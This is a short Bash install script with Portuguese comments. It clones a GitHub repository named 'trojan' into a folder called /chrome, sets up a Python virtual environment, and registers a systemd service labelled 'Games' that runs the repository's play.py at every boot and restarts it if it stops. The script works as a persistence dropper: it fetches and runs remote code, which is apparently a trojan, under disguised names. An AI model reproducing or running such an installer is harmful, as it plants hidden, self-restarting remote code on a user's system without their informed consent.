#!/bin/bash

# Antes de iniciar este comando: chmod +x start.sh

# Instalação do Python e dependências
sudo apt update
sudo apt install -y python3 python3-pip python3-venv git

# Configurações
venv_name="chrome"
venv_dir="./chrome/venv"
python_executable="python3"
username=$(whoami)
repository_url="https://github.com/efraim-lima/trojan"
relative_path="./modules/play.py"
install_directory="/chrome"

# Clone o repositório com permissões do usuário atual
git clone "$repository_url" "$install_directory"

# Criação do ambiente virtual
$python_executable -m venv "$venv_dir/$venv_name"

# Função para ativar o ambiente virtual e iniciar as aplicações
activate_venv_and_start_app() {
    # Ativação do ambiente virtual
    source "$venv_dir/$venv_name/bin/activate"

    # Instalação das dependências do requirements.txt (opcional)
    pip install -r "$install_directory/requirements.txt"

    # Execução dos comandos adicionais dentro do ambiente virtual
    # ... (adicione seus comandos aqui)
}

# Executa a função de ativação do ambiente virtual e início das aplicações
activate_venv_and_start_app

# Criação do arquivo de serviço systemd
service_file="/etc/systemd/system/start.service"
sudo tee "$service_file" > /dev/null <<EOT
[Unit]
Description=Games
After=network.target

[Service]
User=$username
WorkingDirectory=$install_directory
ExecStart=$venv_dir/$venv_name/bin/python $relative_path
Restart=always

[Install]
WantedBy=multi-user.target
EOT

# Recarrega as configurações do systemd
sudo systemctl daemon-reload

# Habilita e inicia o serviço systemd
sudo systemctl enable start.service
sudo systemctl start start.service
